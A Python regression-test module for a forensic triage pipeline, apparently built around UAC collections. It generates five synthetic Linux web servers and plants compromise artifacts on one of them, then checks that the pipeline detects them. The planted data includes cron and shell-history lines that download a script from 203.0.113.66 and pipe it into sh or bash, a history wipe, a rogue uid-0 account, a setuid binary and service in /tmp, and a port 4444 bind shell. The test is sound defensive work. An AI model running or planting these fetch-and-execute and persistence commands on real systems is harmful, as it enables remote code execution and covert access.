"""Build a synthetic UAC fleet and run the whole pipeline offline.

Five near-identical Linux web servers. Four are clean and identical; one (web03)
is compromised. The pipeline should surface web03's anomalies as outliers and the
heuristic should flag the worst ones. This is your demo for Sajjad AND your
regression test - if a refactor stops finding the planted needle, a test fails.

Planted on web03 only:
  - a second uid-0 account 'svc-backup'                       (T1136.001)
  - an authorized_keys entry with no comment                  (T1098.004)
  - a cron job in /etc/cron.d that curls a script into sh     (T1053.003 + T1059)
  - a setuid binary in /tmp                                   (T1548.001)
  - a systemd service running from /tmp                       (T1543.002)
  - a bash_history line piping a download into bash           (T1059.004)
  - a listening port 4444 (bind shell)                        (T1571)
"""

import os
import time
from pathlib import Path

from .common import log

CLEAN_AUTH_KEY = ("ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGNjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2NjY2Nj "
                  "ansible@bastion")
BAD_AUTH_KEY = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJiYmJi"
KNOWN_HOST = ("bastion.corp.local ssh-ed25519 "
              "AAAAC3NzaC1lZDI1NTE5AAAAIGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGhoaGho")
BAD_KNOWN_HOST = ("203.0.113.66 ssh-ed25519 "
                  "AAAAC3NzaC1lZDI1NTE5AAAAIGVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVlZWVl")


def _write(p: Path, text: str, mode=None):
    p.parent.mkdir(parents=True, exist_ok=True)
    p.write_text(text, encoding="utf-8")
    if mode:
        os.chmod(p, mode)


def _bodyfile_line(path, mode, uid=0, gid=0, size=1024, t=None):
    t = int(t or time.time())
    inode = abs(hash(path)) % 900000 + 1000
    return f"0|{path}|{inode}|{mode}|{uid}|{gid}|{size}|{t}|{t}|{t}|{t}"


def build_host(base: Path, host: str, compromised: bool, ts: str):
    root = base / f"uac-{host}-linux-{ts}"
    r = root / "[root]"
    # baseline identical across the fleet
    _write(r / "etc" / "hostname", host + "\n")
    _write(r / "etc" / "passwd",
           "root:x:0:0:root:/root:/bin/bash\n"
           "daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin\n"
           "www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin\n"
           "deploy:x:1000:1000:deploy:/home/deploy:/bin/bash\n")
    _write(r / "home" / "deploy" / ".ssh" / "authorized_keys", CLEAN_AUTH_KEY + "\n")
    _write(r / "home" / "deploy" / ".ssh" / "known_hosts", KNOWN_HOST + "\n")
    _write(r / "home" / "deploy" / ".bash_history",
           "ls -la\ncd /var/www\ngit pull\nsudo systemctl restart nginx\nexit\n")
    _write(r / "etc" / "crontab",
           "17 *\t* * *\troot\tcd / && run-parts --report /etc/cron.hourly\n"
           "0 2\t* * *\troot\t/usr/local/bin/backup.sh\n")
    _write(r / "usr" / "lib" / "systemd" / "system" / "nginx.service",
           "[Unit]\nDescription=nginx\n[Service]\nExecStart=/usr/sbin/nginx -g 'daemon off;'\nUser=www-data\n")
    lr = root / "live_response" / "network"
    ss = ("Netid State Recv-Q Send-Q Local-Address:Port Peer-Address:Port Process\n"
          "tcp LISTEN 0 128 0.0.0.0:22 0.0.0.0:* users:((\"sshd\",pid=800,fd=3))\n"
          "tcp LISTEN 0 128 0.0.0.0:80 0.0.0.0:* users:((\"nginx\",pid=900,fd=6))\n")
    # bodyfile: a handful of normal lines
    bf = [
        _bodyfile_line("/etc/passwd", "-rw-r--r--"),
        _bodyfile_line("/usr/sbin/nginx", "-rwxr-xr-x"),
        _bodyfile_line("/usr/bin/sudo", "-rwsr-xr-x"),  # legit suid, present everywhere
        _bodyfile_line("/home/deploy/.bashrc", "-rw-r--r--", uid=1000, gid=1000),
    ]

    if compromised:
        # second uid-0 account
        with (r / "etc" / "passwd").open("a") as f:
            f.write("svc-backup:x:0:0:backup:/home/svc-backup:/bin/bash\n")
        # extra authorized key with no comment
        with (r / "home" / "deploy" / ".ssh" / "authorized_keys").open("a") as f:
            f.write(BAD_AUTH_KEY + "\n")
        # known_hosts to an external IP
        with (r / "home" / "deploy" / ".ssh" / "known_hosts").open("a") as f:
            f.write(BAD_KNOWN_HOST + "\n")
        # cron.d job curling into sh
        _write(r / "etc" / "cron.d" / "update-check",
               "*/10 * * * * root curl -s http://203.0.113.66/x.sh | sh\n")
        # setuid binary in /tmp
        bf.append(_bodyfile_line("/tmp/.x", "-rwsr-xr-x", size=88088))
        # systemd service from /tmp
        _write(r / "etc" / "systemd" / "system" / "mysvc.service",
               "[Unit]\nDescription=helper\n[Service]\nExecStart=/tmp/.x -d\nUser=root\n")
        # nasty bash history line
        with (r / "home" / "deploy" / ".bash_history").open("a") as f:
            f.write("wget -qO- http://203.0.113.66/m | bash\nhistory -c\n")
        # bind shell listening
        ss += "tcp LISTEN 0 128 0.0.0.0:4444 0.0.0.0:* users:((\"x\",pid=6666,fd=3))\n"

    _write(lr / "ss_-tulpn.txt", ss)
    _write(root / "bodyfile" / "bodyfile.txt", "\n".join(bf) + "\n")
    _write(root / "uac.log", f"uac synthetic collection for {host}\n")
    return root


def run_selftest(out: Path):
    out = Path(out)
    fleet = out / "fleet"
    log("building synthetic 5-host fleet (web03 is compromised)")
    ts = "20260911010101"
    for i in range(1, 6):
        host = f"web{i:02d}"
        build_host(fleet, host, compromised=(host == "web03"), ts=ts)

    from .uac_parse import parse_many
    from .stack import stack_all
    from .triage import triage_outliers

    parse_many([fleet], out / "parsed", recent_days=3650)
    stack_all(out / "parsed", out / "stacked", rare_threshold=1)
    triage_outliers(out / "stacked" / "outliers.csv", out / "triaged", offline=True)

    # assert the needles were found
    import csv
    tri = out / "triaged" / "triaged_outliers.csv"
    rows = list(csv.DictReader(tri.open()))
    hits = {r["verdict"] for r in rows}
    bad = [r for r in rows if r["verdict"] in ("malicious", "suspicious")]
    log("=" * 60)
    log(f"SELFTEST: {len(rows)} outliers, {len(bad)} flagged suspicious/malicious")
    needles = {
        "svc-backup uid0": any("uid0_not_root" in r.get("category", "") + r.get("rationale", "") or
                               r.get("username") == "svc-backup" for r in rows),
        "/tmp setuid": any("/tmp/.x" in r.get("path", "") for r in rows),
        "service from /tmp": any("/tmp/.x" in r.get("exec_start", "") for r in rows),
        "curl|sh cron": any("curl" in r.get("command", "") for r in rows),
        "bind shell 4444": any(r.get("port") == "4444" for r in rows),
        "rogue ssh key": any(r.get("artifact") == "authorized_keys" and not r.get("comment") for r in rows),
        "external known_host": any(r.get("artifact") == "known_hosts" and
                                   "203.0.113.66" in r.get("hostnames", "") for r in rows),
    }
    ok = True
    for name, found in needles.items():
        log(f"  [{'PASS' if found else 'FAIL'}] planted: {name}")
        ok = ok and found
    log("=" * 60)
    log(f"SELFTEST {'PASSED' if ok else 'FAILED'} - see {tri}")
    if not ok:
        raise SystemExit(1)
    return ok
